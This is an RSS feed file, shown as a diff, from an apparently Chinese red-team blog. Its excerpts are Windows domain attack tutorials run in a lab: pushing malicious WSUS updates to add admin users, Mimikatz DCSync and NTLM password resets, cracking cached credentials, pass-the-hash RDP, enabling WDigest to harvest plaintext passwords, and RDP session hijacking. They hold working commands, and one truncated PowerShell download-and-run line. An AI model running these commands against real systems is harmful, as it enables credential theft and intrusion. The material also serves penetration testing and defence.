@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>tips on lzzzzzzz</title>
+    <link>https://lzzbb.github.io/tags/tips/</link>
+    <description>Recent content in tips on lzzzzzzz</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Wed, 11 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://lzzbb.github.io/tags/tips/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WSUS利用</title>
+      <link>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</guid>
+      <description>WSUS简介 WSUS是微软在其网络结构中提供的关于系统补丁更新的一个解决方案，在一些规模较大的域可能会出现。
+WSUS可以在域内机器不出网的时候，将客户端绑定到WSUS Server上，将一些补丁或者组件更新时直接放到WSUS Server，通过 HTTP （8530端口）和 HTTPS （8531端口）与 Microsoft 通信来加载补丁，然后推到指定的域机器上，方便运维进行管理。
+最常见的情况是单域采用一台WSUS更新服务器进行管理，下图是域内单台(左)和多台WSUS右的架构图：
+利用 通过SharpWSUS枚举WSUS信息、推送恶意补丁到目标机器进行横向渗透。
+实验环境： 域名：redteam.lab 1.域内WSUS服务器server2019（机器名：WSUS-1） 2.域内域控Server2016（机器名：DC2） 2.域内机器win7（机器名：dm2007） 当前环境是拿到了域内win7的权限，然后通过WSUS Server进行横向渗透。
+定位当前主机WSUS Server 1.通过注册表
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+2.通过SharpWSUS
+SharpWSUS.exe locate
+由上面的信息收集，可以得到WSUS Server机器名为WSUS-1，然后我们想方设法获得了WSUS-1的机器权限。
+ 通过WSUS-1枚举WSUS服务的详细信息：
+其中包括当前管理的计算机列表、ip、版本信息、上一次更新的时间。
+SharpWSUS.exe inspect
+可以看到域控（DC2）也在这台WSUS Server 更新的目标内，可以向它推送恶意更新，例如：添加本地管理员用户。
+要点 1.WSUS横向最不确定的因素是无法控制客户端何时向WSUS Server拉取补丁信息，这个属性通常在域内搭建WSUS的组策略中设置。利用成功与否决定于客户端安装了攻击者提供的恶意补丁。
+2.WSUS的有效负载必须是Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，使 WSUS Server指向该二进制文件。由于需要签名的二进制文件，可以用PsExec.exe 以 SYSTEM 身份执行、RunDLL32在网络共享上运行恶意 DLL等方法进行横向，下面以psexec举例。
+横向 1.生成一个用psexec执行添加本地管理员组的恶意补丁，其中updateid是补丁的更新id。
+SharpWSUS.exe create /payload:&amp;quot;C:\Users\public\psexec.exe&amp;quot; /args:&amp;quot;-accepteula -s -d cmd.exe /c &#39;net user lzz Qq123456.. /add &amp;amp;&amp;amp; net localgroup administrators lzz /add&#39;&amp;quot; /title:&amp;quot;demo01&amp;quot;</description>
+    </item>
+    
+    <item>
+      <title>利用MS-SAMR协议修改用户密码</title>
+      <link>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</link>
+      <pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</guid>
+      <description>利用场景 1.拿下域控后定位到定位用户或者靶标，需要密码进行登录。 2.拿到某用户hash后，同样想通过该用户账户登录某系统，但目标系统不支持pth或者当前用户权限不支持pth。 虽然拿到了修改/重置密码的权限，但又不想直接修改目标用户的密码，因为这样用户在登录时就会发现自己的密码被修改了，此时有两种情况：
+1.如果有重置密码权限就可以使用SetNTLM来将用户密码重置 2.如果有hash的话可以使用ChangeNTLM修改 登录目标系统后，再将目标密码还原,默认情况下creatorsid用户有以上权限。
+SetNTLM 将域用户的密码或hash重置为新的密码或hash
+利用条件 当前身份对要修改的用户有Reset Password权限（默认域管具有此权限）
+假设此时拿到域控，想修改域内用户marry的密码来登录某系统，先Dcsync看用户当前的hash
+lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
+重置用户密码为123456 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /password:1qaz@WSX
+登陆后再恢复密码 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /ntlm:5e95607216d9a4b7654d831beb9ee95c
+ChangeNTLM 依靠用户hash修改其密码
+利用条件 需要对目标用户有Change Password权限
+该权限一般是veryone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改
+ChangeNTLM受到组策略影响，如果域内密码策略进行了限制，比如设置了密码最短使用期限为1天，这样每天只能修改一次密码。并且如果测试设置了强制密码历史规则时，则在更改次数内不能将密码修改为原密码。
+先关闭域内密码策略
+查询指定用户marry的NTLM Hash
+lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
+重置用户密码为1qaz@WSX lsadump::changentlm /server:192.168.129.130 /user:marry2 /old:5e95607216d9a4b7654d831beb9ee95c /newpassword:1qaz@WSX
+登陆后再恢复密码hash lsadump::changentlm /server:192.168.129.130 /user:marry2 /oldpassword:1qaz@WSX /new:5e95607216d9a4b7654d831beb9ee95c
+如果恢复开始限制的组策略 lsadump::dcsync /domain:redteam.lab /user:jack /csv lsadump::changentlm /server:192.168.129.130 /user:jack /old:100171788f70402eb8cfddf3ea1189d0 /newpassword:123qwe. lsadump::changentlm /server:192.168.129.130 /user:jack /oldpassword:123qwe. /new:100171788f70402eb8cfddf3ea1189d0 会显示 ERROR kuhl_m_lsadump_changentlm_callback ; Bad new NTLM hash or password!</description>
+    </item>
+    
+    <item>
+      <title>MSCASH</title>
+      <link>https://lzzbb.github.io/posts/2021/09/mscash/</link>
+      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/09/mscash/</guid>
+      <description>MSCACHE的原理 Macash（又叫domain cached credentials、DCC、域缓存凭据）在PC连接域控失败的时候（比如员工晚上将电脑带回家）会自动使用缓存凭据来进行登录，这相当于是除了SAM、NDTS，以外的第三个数据库。
+mscash hash 不是NTLM hash，无法用于PTH。
+系统默认保存 10 个凭据（可以更改），当被保存的凭据已经超过 10 个的话，新的凭据会覆盖掉老的凭据；凭据被缓存在注册表里。
+MSCASH的保存位置默认只有 SYSTEM 权限可读，位于HKEY_LOCAL_MACHINE\SECURITY\Cache（本地账户没有这个注册表项）
+使用本地用户打开这个注册表项都为空
+利用mimikatz离线破解 token::elevate #假冒令牌提升至system权限 lsadump::cache 下图是在一台域机器上用本地管理员用户进行登录，抓取到了域内administrator和marry的cache
+而不在域内机器是不能进行读取的
+以administrator为例：
+使用hashcat来进行离线破解,真正密码为Qq123456..
+‘$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589’ hashcat -m2100 &amp;#39;$DCC2$10240#administrator#b25ba143ea4a2b1617f1d1db7a41f589&amp;#39; top10000.txt --force --potfile-disable 破解了域管administrator的明文密码，所以如果在横向没有头绪的时候，不要忘记了这个方法，可能会有意想不到的收获。
+禁用凭证缓存 在组策略中设置禁用缓存
+计算机配置—windows设置—安全设置—本地策略—安全选项 交互式登录：之前登录到缓存的次数（域控制器不可用时） 默认是10，设置为0</description>
+    </item>
+    
+    <item>
+      <title>hash登陆RDP</title>
+      <link>https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/</link>
+      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/</guid>
+      <description>注入的哈希用户需要是目标机器的本地管理员
+ 场景 假设抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份RDP登录主机。
+Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持Restricted Admin mode。也就是使用当前账户的hash凭据来登录远程桌面，无需输入明文密码。
+条件： 1. Win10、server12及以上才可以利用，Win7和Server08默认不支持，需要安装2871997、2973351补丁。 2. 如果用户只在Remote Desktop Users组中是无法连接成功的，因为该机制就是针对受限的管理员模式。 复现 在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：
+sekurlsa::pth /user:administrator /domain:192.168.16.62 /ntlm:06d8a9bafc009e178100087bb4e31ada “/run:mstsc.exe /restrictedadmin”
+如果目标机器没有开启Restricted Admin mode可以执行如下命令开启：
+REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+查看是否已开启 DisableRestrictedAdmin
+REG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin”
+如果返回 REG_DWORD 0x0 就是开启
+遇到CredSSP加密数据库错误是大概是因为win10家庭版，一条命令直接解决。
+REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
+防御措施 组策略 — 计算机配置 — 管理模板 — 系统 — 凭据分配 — 限制向远程服务器分配凭据，选择已启用</description>
+    </item>
+    
+    <item>
+      <title>wdigest</title>
+      <link>https://lzzbb.github.io/posts/2021/06/wdigest/</link>
+      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2021/06/wdigest/</guid>
+      <description>wdigest概述 windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。
+老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。
+原理 在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。
+但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。
+修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。
+ 开启wdigest Auth读取明文密码 启用或者禁用WDigest修改注册表位置:
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
+UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文； UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。 cmd:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+powershell:
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+meterpreter
+reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
+强制锁屏让用户输入密码/重启 ====cmd==== rundll32 user32.dll,LockWorkStation ====Powershell==== Function Lock-WorkStation { $signature = @&amp;#34; [DllImport(&amp;#34;user32.dll&amp;#34;, SetLastError = true)] public static extern bool LockWorkStation(); &amp;#34;@ $LockWorkStation = Add-Type -memberDefinition $signature -name &amp;#34;Win32LockWorkStation&amp;#34; -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null } Lock-WorkStation powershell -c “IEX (New-Object Net.</description>
+    </item>
+    
+    <item>
+      <title>定位域控</title>
+      <link>https://lzzbb.github.io/posts/2020/09/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7/</link>
+      <pubDate>Tue, 22 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2020/09/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7/</guid>
+      <description>DC通常开了88和389，但ldap不只是域才用，464端口用于复制、用户和计算机身份验证、信任，所以也可以探测464端口来判断是否是DC。
+net group “domain controllers” /do nslookup -type=all _ldap._tcp.dc._msdcs.redteam.lab （`会返回所有dcip`） net time /do systeminfo net config workstation ipconfig /all nltest /domain_trusts /all_trusts #返回受信任域列表 nltest /dclist:redteam.lab nltest /dsgetdc:redteam.lab 通过DNS指向 （需要绑定DNS） Windows nslookup –qt=ns redteam.lab Nslookup -type=SRV _ldap._tcp.redteam.lab linux dig redteam.lab @192.168.129.130 dig _ldap._tcp.redteam.lab srv @192.168.129.130 域外定位域机器 (无需绑定DNS) nslookup redteam.lab 192.168.129.130 nslookup dmwin10.redteam.lab 192.168.129.130 </description>
+    </item>
+    
+    <item>
+      <title>rdp会话劫持</title>
+      <link>https://lzzbb.github.io/posts/2020/09/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/</link>
+      <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://lzzbb.github.io/posts/2020/09/rdp%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/</guid>
+      <description>执行quser 或者 qwinsta 查看会话id 尽管目前是离线状态，如果机器是在三天内注销的，也可以进行登陆劫持
+ps：需要system权限（psexec或者凭证窃取，shift后门都可）
+Tscon + 要劫持的会话ID + /DEST:你的会话名 #执行完就会切到你劫持会话的桌面。
+tscon 3 /DEST:console
+ID为2目前的状态已经断开了，但是如果是在三天之内注销的，还是可以登陆劫持。
+tscon 2 /DEST:console</description>
+    </item>
+    
+  </channel>
+</rss>
